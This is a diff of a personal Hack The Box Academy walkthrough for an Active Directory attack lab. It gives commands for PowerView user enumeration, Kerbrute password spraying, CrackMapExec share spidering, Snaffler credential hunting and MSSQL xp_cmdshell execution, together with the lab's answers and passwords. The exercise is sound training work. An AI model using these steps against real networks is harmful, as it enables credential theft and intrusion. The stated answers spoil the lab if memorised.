@@ -81,38 +81,128 @@ HTB_@cademy_stdnt!
 ```
 
 ```go
-ssh -X htb-student@10.129.16.227
+ssh -X htb-student@10.129.23.139
 ```
 
 
 Head to your Kerbrute directory in `cd ~/tools/kerbrute` and execute`sudo make all` if you don't have a Windows executable ..
 
 ```go
-scp PowerView.ps1 kerbrute_windows_amd64.exe htb-student@10.129.16.227:~/Desktop/HTB
+scp PowerView.ps1 kerbrute_windows_amd64.exe htb-student@10.129.23.139:~/Desktop/HTB
+```
+
+```go
+xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /drive:HTB,/home/htb-student/Desktop /smart-sizing:2400x1200
 ```
 
 >[!Warning] "$DISPLAY environment variable not properly set" error message
-> I got the above error message when attempting to RDP into the MS01 host. You must ssh via `ssh -X user@remote_host` to let SSH handle the tunneling via the -X or -Y flags
+> I got the above error message when attempting to RDP into the MS01 host. via xfreerdp. You must ssh via `ssh -X user@remote_host` to let SSH handle the tunneling via the -X or -Y flags. Or just use evil-winrm
+
 
 ```go
-xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200
+evil-winrm -i 172.16.7.50  -u 'AB920' -p 'weasal'
 ```
+
 
 >[!Info] Try any of these and pair it with the password spraying technique
 
 Export to username list
+
 ```go
-Get-NetUser | Select-Object -ExpandProperty samaccountname | Out-File -FilePath .\userlist.txt
+Import-Module .\PowerView.ps1
 ```
 
 ```go
-Get-DomainUser | Select-Object -ExpandProperty samaccountname | Out-File -FilePath .\ad_users.txt -NoTypeInformation
+Set-ExecutionPolicy Bypass -Scope Process
 ```
 
-Export admin to admin_users.txt
 ```go
-Get-NetUser | Where-Object { $_.samaccountname -like "*admin*" } |
-    Select-Object -ExpandProperty samaccountname |
-    Out-File .\admin_users.txt
+Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content ad_users.txt 
 ```
 
+```go
+Get-Content .\admin_users.txt | select -First 10
+```
+
+Kerbrute Password Spray
+```go
+./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.7.50 admin_users.txt Welcome1
+```
+
+Answer
+```go
+BR086
+```
+
+
+
+#### Question 5: What is this user's password?
+
+Answer:
+```go
+Welcome1
+```
+
+#### Question 6: Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
+
+Hunt for shares
+```go
+sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' --shares
+```
+
+![[Pasted image 20260609183841.png]]
+
+Use the spider_plus module to dig through the readable IPC share. Check the output file in `/tmp/cme_spider_plus/172.16.7.50.json`
+```GO
+sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' --shares -M spider_plus --share 'Department Shares'
+```
+
+Cat the output file
+```go
+cat /tmp/cme_spider_plus/172.16.7.3.json
+```
+
+![[Pasted image 20260609184056.png]]
+
+```go
+sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' 'Department Shares\IT\Private\Development/web.config'
+```
+
+```go
+smbclient //172.16.7.3/Department Shares/IT/Private/Development -U br086 -c "get web.config web.txt"
+```
+
+None of these worked. HTB wants me to use snaffler
+```go
+scp Snaffler.exe htb-student@10.129.23.139:~/Desktop
+```
+
+Connect to the MS01
+```go
+evil-winrm -i 172.16.7.3  -u 'br086' -p 'Welcome1'
+```
+
+```go
+.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
+```
+
+Answer
+```go
+D@ta_bAse_adm1n!
+```
+
+username
+```go
+netdb
+```
+
+
+#### Question 7: Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
+
+```go
+python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172.16.7.60 --windows-auth
+```
+
+```go
+EXEC xp_cmdshell 'type "C:\\Users\\Administrator\\Desktop\\flag.txt"';
+```
